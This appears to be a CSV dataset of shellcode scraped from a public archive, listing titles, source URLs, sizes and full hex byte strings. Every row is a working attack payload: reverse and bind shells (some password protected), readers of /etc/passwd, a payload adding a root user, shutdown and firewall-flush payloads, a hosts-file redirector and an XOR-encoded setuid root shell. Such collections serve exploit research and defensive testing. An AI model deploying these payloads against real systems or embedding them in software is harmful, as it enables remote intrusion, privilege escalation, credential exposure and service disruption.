title,url,size,bytes
"execve('/bin/bash',{NULL},{NULL})",https://shell-storm.org/shellcode/files/shellcode-909.html,24,48b82f62696e2f73680050545f31c050b03b545a545e0f05
execveat('/bin//sh') 29 bytes shellcode,https://shell-storm.org/shellcode/files/shellcode-905.html,29,6a4258fec448995248bf2f62696e2f2f736857545e4989d04989d20f05
Add map in /etc/hosts file,https://shell-storm.org/shellcode/files/shellcode-896.html,110,4831c04883c0024831ff4831f65649b82f6574632f2f2f2f49ba2f2f2f686f737473415241504801e74831f66681c601040f0548974831c04883c001eb185eb2130f054831c04883c0030f054831c0b03c4831ff0f05e8e3ffffff3132372e312e312e3120676f6f676c652e6c6b
Connect Back Shellcode,https://shell-storm.org/shellcode/files/shellcode-895.html,139,31c031d231db31c9b002cd8083f8017c02eb62506a016a02b066b30189e1cd8089c331c9b03fcd804183f90475f6687f01010166681b39666a0289e16a10515389e1b066cd8031c929c8751bb002cd8083f8017c0531c050eb0db00beb1f5e525689e189f3cd8031c0b006cd80f3900f31f390eb8b31c0b00131dbcd80e8dcffffff2f62696e2f62617368
Shutdown,https://shell-storm.org/shellcode/files/shellcode-892.html,64,4831c0995066682d685459506a7766686f6e545b505351545e50eb195f6a0f59804f0f01e2fa6a3b580f05e8e2ffffff2f2e2e7261686d2e72677473636e766d
Read password,https://shell-storm.org/shellcode/files/shellcode-891.html,105,4831f6eb3e5f6a185a80740fff32e2fa806f0b41806f18416a02580f0550415e4883c70c6a665e6a02580f0550415f4831c041575f545e66baffff0f05505a415f6a01580f056a3c580f05e8bdffffff2f5746511d425341414556731d465f421d5d4746545b5e5773
Password Protected Reverse Shell,https://shell-storm.org/shellcode/files/shellcode-890.html,136,4831c0505050505ab00250505e5f48d1ee04270f05c604240266c74424025c11c74424040100007f8344240402020202545e505f80c210b02a0f0550545e83ea0c0f055059575883e903545f6870617373545ea7750380c102505f5131c048ffce515e04210f0559e2f7eb075f884707505a043b0f05e8f4ffffff2f62696e2f736841
Password Protected Bind Shell,https://shell-storm.org/shellcode/files/shellcode-889.html,147,4831c0505050505ab00250505e5f48d1ee04270f05505f58c604240266c74424025c11545e505a80c21004310f056a025e04320f05505a505e042b0f0550505f415f4831c050545e4883c2040f054831c941ffc1545f6870617373545ea7750380c1024989fd5131c048ffce515e04210f0559e2f7eb075f88470750505e5a043b0f05e8f4ffffff2f62696e2f736841
Read /etc/passwd,https://shell-storm.org/shellcode/files/shellcode-878.html,82,eb3f5f80770b414831c004024831f60f056681ecff0f488d34244889c74831d266baff0f4831c00f054831ff4080c7014889c24831c004010f054831c0043c0f05e8bcffffff2f6574632f70617373776441
shutdown -h now,https://shell-storm.org/shellcode/files/shellcode-877.html,65,4831c04831d2506a7766686e6f4889e35066682d684889e15049b82f7362696e2f2f2f49ba73687574646f776e415241504889e7525351574889e64883c03b0f05
Bind_TCP 4444  with password,https://shell-storm.org/shellcode/files/shellcode-873.html,173,6a29586a025f6a015e930f05974831c0c74424fc0000000066c74424fa5c11c64424f8024883ec086a31584889e66a105a0f056a32586a025e0f056a2b584883ec104889e66a104889e20f054c89c86a03580f054c89c74831f66a21580f0548ffc64883fe02e0f54831c06a105a4883ec104889e631ff0f05488d3d00000000be64726f777373a57374545ea7750380c1024989fd5131c048ffce515e04210f0559e2f7eb075f88470750505e5a043b0f05e8f4ffffff2f62696e2f736841
TCP reverse shell with password,https://shell-storm.org/shellcode/files/shellcode-871.html,138,6a29586a025f6a015e990f054897c74424fcc0a8010966c74424fa115cc64424f8024883ec086a2a584889e66a105a0f056a035e48ffce6a21580f0575f64889c799884424ff4883ec0152488d7424f080c2100f0548b8646f6f6d6564726157488d3e48af74056a3c580f055f4831c048bb2f62696e2f2f7368534889e7504889e2574889e6043b0f05
TCP bind shell with password,https://shell-storm.org/shellcode/files/shellcode-870.html,175,6a29586a025f6a015e990f0548974831c0894424fc66c74424fa115cc64424f8024883ec086a31584889e69980c2100f056a32580f056a2b584883ec104831f64889e6c64424ff104883ec01994889e20f054889c74831c0884424ff4883ec019952488d7424f080c2100f0548b8646f6f6d6564726157488d3e48af74074831c0043c0f055f6a035e48ffce6a21580f0575f65648bb2f62696e2f2f7368534889e7564889e2574889e66a3b580f05
Reads data from /etc/passwd to /tmp/outfile,https://shell-storm.org/shellcode/files/shellcode-867.html,118,4831c0b0024831ffbb737764005348bb2f65746370617353488d3c244831f60f054889c34831c04889df4889e666baffff0f054989c04889e04831db53bb66696c655348bb2f746d706f7574534889c34831c0b002488d3c244831f66a66665e0f054889c74831c0b001488d334831d24c89c20f05
shell bind TCP random port,https://shell-storm.org/shellcode/files/shellcode-859.html,57,4831f648f7e6ffc66a025fb0290f05525e505fb0320f05b02b0f05575e4897ffceb0210f0575f85248bf2f2f62696e2f736857545fb03b0f05
tcp bind shell,https://shell-storm.org/shellcode/files/shellcode-858.html,150,4831c04831ff4831f64831d24d31c06a025f6a015e6a065a6a29580f054989c04d31d241524152c604240266c74424027a694889e641505f6a105a6a31580f0541505f6a015e6a32580f054889e64831c9b110514889e241505f6a2b580f05594d31c94989c14c89cf4831f66a035e48ffce6a21580f0575f64831ff57575e5a48bf2f2f62696e2f736848c1ef0857545f6a3b580f05
reverse tcp bind shell,https://shell-storm.org/shellcode/files/shellcode-857.html,118,4831c04831ff4831f64831d24d31c06a025f6a015e6a065a6a29580f054989c04831f64d31d24152c604240266c74424027a69c7442404c080100a4889e66a105a41505f6a2a580f054831f66a035e48ffce6a21580f0575f64831ff57575e5a48bf2f2f62696e2f736848c1ef0857545f6a3b580f05
add user with passwd,https://shell-storm.org/shellcode/files/shellcode-801.html,189,4831c0b0714831db4831c90f054831c0b0724831db4831c90f054831dbbbff73776448c1eb085348bb2f6574632f7061735348bbff6e2f626173680a48c1eb085348bb726f6f743a2f62695348bb673a303a303a3a2f5348bb3574584b556b55465348bb7430723a33556754534889e3554889e54883ec1048895df066be01044889df4883c7284831c0b0020f058945fc4889d94831d2b2274889ce4889c74831c0b0010f054831ff8b7dfc4831c0b0030f054831c0b03c4831db0f05
"execve('/sbin/iptables', ['/sbin/iptables', '-F'], NULL)",https://shell-storm.org/shellcode/files/shellcode-683.html,49,4831c05066682d464889e148bbffff7461626c657348c1eb105348bb2f7362692f6970534889e75051574889e6b03b0f05
Execute /bin/sh,https://shell-storm.org/shellcode/files/shellcode-806.html,27,31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05
bind-shell with netcat,https://shell-storm.org/shellcode/files/shellcode-822.html,131,4831d248bfff2f62696e2f6e6348c1ef08574889e748b9ff2f62696e2f736848c1e908514889e148bbffffffffffff2d6548c1eb30534889e349baffffffff3133333749c1ea2041524989e249b9ffffffffffff2d7049c1e93041514989e149b8ffffffffffff2d6c49c1e83041504989e0525153415241514150574889e6b03b0f05
connect back shell with netcat,https://shell-storm.org/shellcode/files/shellcode-823.html,109,4831d248bfff2f62696e2f6e6348c1ef08574889e748b9ff2f62696e2f736848c1e908514889e148bbffffffffffff2d6548c1eb30534889e349baffffffff3133333749c1ea2041524989e2eb11415952515341524151574889e6b03b0f05e8eaffffff3132372e302e302e31
"setreuid (0,0) & execve('/bin/ash',NULL,NULL) + XOR encoded",https://shell-storm.org/shellcode/files/shellcode-815.html,85,4d31c041b17feb1a584831c94831db8a1c084c39c374104430cb881c0848ffc1ebede8e1ffffff374ebf37fcbf0e374e80374e89707a946f374ebf37fcbf4420374e89374ead707a9794808080501d1611501e0c17
